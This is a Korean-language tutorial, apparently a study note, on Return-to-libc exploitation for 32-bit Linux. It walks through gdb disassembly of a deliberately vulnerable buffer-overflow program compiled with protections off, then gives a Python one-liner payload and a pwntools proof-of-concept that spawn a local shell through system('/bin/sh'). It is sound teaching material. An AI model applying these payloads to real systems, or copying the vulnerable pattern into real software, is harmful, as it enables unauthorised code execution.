# Return to Libc

---

### 0x01 What is it?

RTL 공격은 스택에 NX-bit 보안 기법이 적용 되었을때 사용하는 공격 기법이다. NX란 Never eXecutable stack 을 줄인 말로 "스택에서 코드 실행 불가" 라는 보안 역할을 한다.

NX-bit 때문에 스택에서 shellcode를 삽입하고 이 주소를 RET에 overwrite 해도 실행되지 않아 공격이 실패하게 된다. 이를 우회 하기 위한 기법이 Return to Libc 이다.

Return to Libc은 공유 라이브러리 함수의 주소를 가져와 RET에 overwrite 하고 이를 호출하는 공격 기법이다. 바이너리에 호출하려는 함수가 없어도 이미 메모리에 적재되어 있는 공유 라이브러리 함수의 주소를 가져와서 사용이 가능하다.

---

### 0x02 Prior knowledge

함수를 호출할 때, 함수의 인자 값과 함수 호출이 어떻게 일어나는지, 이러한 개념을 알고 있으면 Return to Libc 공격 기법에 대해 쉽게 이해 할 수 있다. 만약 이 부분에 대해 알고 있다면 0x03으로 넘어 가도 좋다. 그렇지 않으면 보는걸 추천한다.

32bit 환경에서 아래 코드를 컴파일 해보자. (32bit 환경은 인자를 넘겨줄 때 스택으로 push 하고 인자 값을 가져오지만, 64bit 환경에서는 레지스터에 저장하고 이를 가져온다고 한다.)

```c
/* File name: callFunc.c */

#include <stdio.h>

void callme(int a){
        int b = a;
        printf("%d\n",b);
}

int main(){
        callme(1);
}
```

컴파일 할때 메모리 보호를 끄는 옵션을 넣어 주었다.

```bash
gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -fno-pic -no-pie -o callFunc callFunc.c 
```

gdb로 callFunc 바이너리를 까보면 아래 처럼 main+3 에서 1 값을 스택에 넣고 main+5에서 callme 함수를 호출한다.

```gdb
$ gdb -q callFunc
Reading symbols from callFunc...(no debugging symbols found)...done.
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048445 <+0>:     push   ebp
   0x08048446 <+1>:     mov    ebp,esp
   0x08048448 <+3>:     push   0x1
   0x0804844a <+5>:     call   0x8048426 <callme>
   0x0804844f <+10>:    add    esp,0x4
   0x08048452 <+13>:    mov    eax,0x0
   0x08048457 <+18>:    leave  
   0x08048458 <+19>:    ret    
End of assembler dump.
gdb-peda$ 
```

main+5에서 CALL은 함수를 호출하기 전에 CALL 다음 명령어 주소를 스택에 저장한 후 해당 함수로 점프한다.

| 어셈블리 |  행동  |
| ------------ | ------------ |
| CALL  | PUSH  EIP <br> JMP addr |


즉 CALL 명령어로 callme 함수에 점프하기 직전의 스택은 다음과 같다.

```stack
<low addr>

========     <--- ESP
main 함수로 돌아올때 실행되는 명령어 주소(RET 주소라고 생각 하면 됨)
========
1 (인자 값)
========
....
========
....
========    <--- EBP

<high addr>
```

CALL 명령어로 callme 함수가 호출되었고 gdb로 callme 함수에 들어가보면 아래처럼 어셈블리 명령어가 출력이 된다. 

```gdb
gdb-peda$ disas callme
Dump of assembler code for function callme:
   0x08048426 <+0>:     push   ebp
   0x08048427 <+1>:     mov    ebp,esp
   0x08048429 <+3>:     sub    esp,0x4
   0x0804842c <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x0804842f <+9>:     mov    DWORD PTR [ebp-0x4],eax
   0x08048432 <+12>:    push   DWORD PTR [ebp-0x4]
   0x08048435 <+15>:    push   0x80484e0
   0x0804843a <+20>:    call   0x80482e0 <printf@plt>
   0x0804843f <+25>:    add    esp,0x8
   0x08048442 <+28>:    nop
   0x08048443 <+29>:    leave  
   0x08048444 <+30>:    ret    
End of assembler dump.
gdb-peda$ 
```

위 코드에서 callme+3까지 함수의 프롤로그와 공간 할당을 한 후의 스택을 나타내면 다음과 같다.

```stack
<low addr>

========     <--- ESP

========     <--- EBP
SFP
========
RET
========     <--- EBP+8
1 (인자 값)
========

<high addr>
```

callme+6 에서 $EBP+0x08 주소에 위치한 값을 EAX에 저장하려고 한다. 위 스택을 참고하여 $EBP+0x08 에 위치한 값은 1인 것을 알 수 있다. 

즉, 함수에 인자 값을 보내고 함수를 호출할때, 호출된 함수는 8bytes 떨어진 곳에서 값을 가져온다는 것이다. 이 개념을 잘 이해하고 Return to Libc 공격 기법에 적용해보자.

---

### 0x03 How to RTL

RTL 공격 실습을 위해 아래 코드를 컴파일 해보자. 마찬가지로 보호 기법을 끄는 옵션을 넣어 컴파일을 한다.

```c
/* File name: rtl.c */

#include <stdio.h>

int main(){
        char buf[100];
        read(0,buf,200);
        printf("%s\n",buf);
}
```

```
gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -fno-pic -no-pie -o rtl rtl.c 
```

gdb로 rtl 바이너리를 까보면, 0x64 만큼 공간을 할당한다. read 함수를 호출하기 전에 3개의 인자를 스택에 push한다. 0x02를 읽어봤다면 '아하!' 할 것이다.

- main+6: 0xc8(200) 값을 넣는다.
- main+11, 14: EAX에 EBP-0x64 주소를 넣고 이 주소를 push 한다.
- main+15: 마지막 값 0x0 값을 push 한다.
- read 함수를 호출한다.

여기서 알 수 있는 것은 ebp-0x64는 buf의 주소임을 알 수 있다.

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048456 <+0>:     push   ebp
   0x08048457 <+1>:     mov    ebp,esp
   0x08048459 <+3>:     sub    esp,0x64
   0x0804845c <+6>:     push   0xc8
   0x08048461 <+11>:    lea    eax,[ebp-0x64]
   0x08048464 <+14>:    push   eax
   0x08048465 <+15>:    push   0x0
   0x08048467 <+17>:    call   0x8048300 <read@plt>
   0x0804846c <+22>:    add    esp,0xc
   0x0804846f <+25>:    lea    eax,[ebp-0x64]
   0x08048472 <+28>:    push   eax
   0x08048473 <+29>:    call   0x8048310 <puts@plt>
   0x08048478 <+34>:    add    esp,0x4
   0x0804847b <+37>:    mov    eax,0x0
   0x08048480 <+42>:    leave  
   0x08048481 <+43>:    ret    
End of assembler dump.
gdb-peda$ 
```

RET 주소를 overwrite 하기 위해서는 100bytes(0x64)에 4bytes(SFP) 만큼, 총 104bytes를 입력하면 RET 주소를 조작 할 수 있게 된다.

RTL 공격 기법은 RET 주소에 공유 라이브러리 함수의 주소를 넣어 호출된 함수를 사용할 수 있게 된다. 우리가 호출할 함수는 system() 함수이다. system() 함수의 주소를 알아내기 위해 우선 main에 breakpoint 를 걸고 실행한다.

```
gdb-peda$ b *main
Breakpoint 1 at 0x8048456
gdb-peda$ r
```

p system 명령어로 system() 함수의 주소를 알아낸다. system()의 주소는 0xf7e21d10 이다.
```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e21d10 <system>
```

system() 함수의 주소를 찾아냈고, 인자로 쉘을 실행하기 위한 "/bin/sh" 문자열을 넣어줘야 한다. "/bin/sh" 문자열을 찾기 위해서 아래 명령어 find "/bin/sh" 를 입력하면 "/bin/sh"의 주소는 0xf7f608cf 임을 알 수 있다.

```
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f608cf ("/bin/sh")
gdb-peda$ 
```

가장 중요한 2가지의 주소를 찾았고 이제 이를 buf 변수에 넣어보자.

payload의 구성은 아래와 같다. system address 와 /bin/sh address 사이에 4bytes의 더미 값이 들어가 있다. 이 이유는 0x02에서 설명했듯이, 32bit 환경에서는 호출된 함수가 인자 값을 가져오기 위해 EBP+0x8 만큼의 주소에서 가져 온다고 말했었다. 그래서 system address 와 /bin/sh address 사이에 4bytes의 더미 값이 들어가는 것이다. 

```
[Dummy bytes](104bytes) + [system addr](4bytes) + [Dummy bytes](4bytes) + [/bin/sh addr](4bytes)
```

최종적으로 payload는 아래와 같다.

```
$ (python -c 'print "A"*104 + "\x10\x1d\xe2\xf7" + "AAAA" +"\xcf\x08\xf6\xf7"'; cat) | ./rtl
```

위 코드를 실행하면 아래와 같이 shell을 획득했다.

```
$ (python -c 'print "A"*104 + "\x10\x1d\xe2\xf7" + "AAAA" +"\xcf\x08\xf6\xf7"'; cat) | ./rtl
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

ls
rtl  rtl.c
```

### 0x04 POC code

위 과정을 python의 pwntools를 이용하여 코드로 나타내면 아래와 같다.

```python 
# File name: poc.py
from pwn import *

p = process("./rtl")

systemAddr = 0xf7e21d10
shAddr = 0xf7f608cf

payload = "A"*104
payload += p32(systemAddr)
payload += "AAAA"
payload += p32(shAddr)

p.send(payload)
p.interactive()
```

위 코드를 실행하면 shell을 획득하게 된다.


```
$ python poc.py 
[+] Starting local process './rtl': pid 32571
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x1dAAAAxff\xff\xa4\xff
$ ls
rtl  rtl.c
```




